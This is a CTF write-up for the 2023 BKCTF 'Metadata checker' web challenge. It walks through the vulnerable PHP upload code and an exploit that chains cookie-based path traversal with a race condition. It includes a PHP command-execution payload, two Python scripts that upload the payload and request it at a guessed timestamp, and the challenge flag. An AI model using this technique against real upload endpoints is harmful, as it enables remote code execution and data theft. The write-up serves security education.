---
title: 2023 BKCTF - Metadata checker
date: 2023-08-19 00:00:00 +0700
categories:
  - Write-ups
tags:
  - 2023_BKCTF
  - Web Exploitation
  - Race conditions
---

## Description

> Start the race with a basic tool provided by us.

### Attached

[metadata-checker.zip](https://github.com/encuetee/CTF-writeups/blob/main/2023/2023_BKCTF/attached/metadata-checker.zip)

This is ```index.php``` backend file
```php
<?php
error_reporting(0);

setcookie("user", "BKSEC_guest", time() + (86400 * 30), "/"); // Cookie will be valid for 30 days

if (isset($_FILES) && !empty($_FILES)) {
    $uploadpath = "/var/tmp/";
    $error = "";
    
    $timestamp = time();

    $userValue = $_COOKIE['user'];
    $target_file = $uploadpath . $userValue . "_" . $timestamp . "_" . $_FILES["image"]["name"];

    move_uploaded_file($_FILES["image"]["tmp_name"], $target_file);

    if ($_FILES["image"]["size"] > 1048576) {
        $error .= '<p class="h5 text-danger">Maximum file size is 1MB.</p>';
    } elseif ($_FILES["image"]["type"] !== "image/jpeg") {
        $error .= '<p class="h5 text-danger">Only JPG files are allowed.</p>';
    } else {
      $exif = exif_read_data($target_file, 0, true);

      if ($exif === false) {
          $error .= '<p class="h5 text-danger">No metadata found.</p>';
      } else {
          $metadata = '<table class="table table-striped">';
          foreach ($exif as $key => $section) {
              $metadata .=
                  '<thead><tr><th colspan="2" class="text-center">' .
                  $key .
                  "</th></tr></thead><tbody>";
              foreach ($section as $name => $value) {
                  $metadata .=
                      "<tr><td>" . $name . "</td><td>" . $value . "</td></tr>";
              }
              $metadata .= "</tbody>";
          }
          $metadata .= "</table>";
      }
    }
}
?>
<!DOCTYPE html>
<!-- Modified from https://getbootstrap.com/docs/5.3/examples/checkout -->
<html lang="en" data-bs-theme="auto">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>BKSEC Metadata checker</title>
  <link href="assets/dist/css/bootstrap.min.css" rel="stylesheet">
  <link href="assets/dist/css/checkout.css" rel="stylesheet">
  <link rel="icon" href="assets/images/logo.png" type="image/png">
</head>

<body class="bg-body-tertiary">

  <div class="container">
    <main>
      <div class="py-5 text-center">
        <a href="/"><img class="d-block mx-auto mb-4"  src="assets/images/logo.png" alt="" width="72"></a>
        <h2>BKSEC Metadata checker</h2>
        <p class="lead">Only jpg files are supported and maximum file size is 1MB.</p>
      </div>
      <form action="/index.php" method="post" enctype="multipart/form-data">
        <label class="h5 form-label">Upload your image</label>
        <input class="form-control form-control-lg my-4" name="image" id="formFileLg" type="file" required/>
        <div class="col text-center">
            <button class="btn btn-primary btn-lg" type="submit">Upload</button>
        </div>
      </form>
	    <?php
        // I want to show a loading effect within 1.5s here but don't know how
        sleep(1.5);
        // This might be okay..... I think so
        // My teammates will help me fix it later, I hope they don't forget that
        echo $error;
        echo $metadata;
        unlink($target_file);
        ?>
    </main>

    <footer class="my-5 pt-5 text-body-secondary text-center text-small">
      <p class="mb-1">&copy; 2023 CLB An Toàn Thông Tin - BKHN</p>
    </footer>
  </div>
  <script src="assets/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
```

## Analization

When a file is uploaded, firstly its mimetype and size are checked
```php
if ($_FILES["image"]["size"] > 1048576) {
    $error .= '<p class="h5 text-danger">Maximum file size is 1MB.</p>';
} elseif ($_FILES["image"]["type"] !== "image/jpeg") {
    $error .= '<p class="h5 text-danger">Only JPG files are allowed.</p>';
}
```

Then the saving path will determined by
```php
$uploadpath = "/var/tmp/";
$error = "";

$timestamp = time();

$userValue = $_COOKIE['user'];
$target_file = $uploadpath . $userValue . "_" . $timestamp . "_" . $_FILES["image"]["name"];
```

Next, the file is saved down
```php
move_uploaded_file($_FILES["image"]["tmp_name"], $target_file);
```

Next section is reading the exif data
```php
if ($exif === false) {
          $error .= '<p class="h5 text-danger">No metadata found.</p>';
      } else {
          $metadata = '<table class="table table-striped">';
          foreach ($exif as $key => $section) {
              $metadata .=
                  '<thead><tr><th colspan="2" class="text-center">' .
                  $key .
                  "</th></tr></thead><tbody>";
              foreach ($section as $name => $value) {
                  $metadata .=
                      "<tr><td>" . $name . "</td><td>" . $value . "</td></tr>";
              }
              $metadata .= "</tbody>";
          }
          $metadata .= "</table>";
      }
```

Then the metadata is displayed, and the file is deleted
```php
	    <?php
        // I want to show a loading effect within 1.5s here but don't know how
        sleep(1.5);
        // This might be okay..... I think so
        // My teammates will help me fix it later, I hope they don't forget that
        echo $error;
        echo $metadata;
        unlink($target_file);
        ?>
```

## Vulnerability

The file is saved for 1.5 seconds before being deleted. That is the problem!

If we upload the ```exploit.php``` file, we can call it to read ```/flag.txt``` before it is deleted
```php
<?php system("cat /flag.txt;") ?>
```

Target is clear! Now let's kill the site down!

## Exploitation

The website is at ```/var/www/html```, so our target is to upload file there.

Check the file path again
```php
$uploadpath = "/var/tmp/";
$error = "";

$timestamp = time();

$userValue = $_COOKIE['user'];
$target_file = $uploadpath . $userValue . "_" . $timestamp . "_" . $_FILES["image"]["name"];
```

The file is uploaded to ```/var/tmp/```.

But ```$userValue``` is get from ```$_COOKIE['user']``` by ```$userValue = $_COOKIE['user'];```, so we can handle it, by giving it value ```../../var/www/html```! (This is the minor vulnerability: using untrusted data directively)

Uploading file is done! Now we need to call the file.

Another annoying here, ```$timestamp```.

We can run 2 independent thread, one is keep uploading code, another keep calling the file from the future timestamp.

- Current timestamp is 1004. The second thread keeps calling the file from timestamp 1009.

- The first thread keeps uploading file. It will be named 1004, 1005, 1006, etc. When it is named 1009, it will be called successfully.

## Solution

```exploit.php``` file to be upload
```php
<?php system("cat /flag.txt;") ?>
```

```metadata_inp.py``` keeps uploading ```exploit.php```
```python
import requests

session = requests.Session()
session.cookies.set('user', '../../var/www/html/a')

while True:
    with open('exploit.php', 'rb') as f:
        # r = session.post('http://localhost:1337/', files={'image':('exploit.php', f)})
        r = session.post('http://13.215.248.36:30301', files={'image':('exploit.php', f)})
        print(r.status_code)
```

and ```metadata_inp.py``` keeps calling ```exploit.php```
```python
import time
import requests

session = requests.Session()
session.cookies.set('user', '../../var/www/html/a')

timestamp = int(time.time()) + 5
while 1:
    # r = session.get('http://localhost:1337/a_{}_exploit.php'.format(timestamp))
    r = session.get('http://13.215.248.36:30301/a_{}_exploit.php'.format(timestamp))
    print(timestamp)
    if (r.status_code == 200):
        print(r.text)
        break
```

The flag is
```
BKSEC{Th!s_1s_just_the_st@rt_0f_the_r@ce_56a7ea5707919380ae4685b4adaba65e}
```

## Summarization

- [Race conditions](https://portswigger.net/web-security/race-conditions)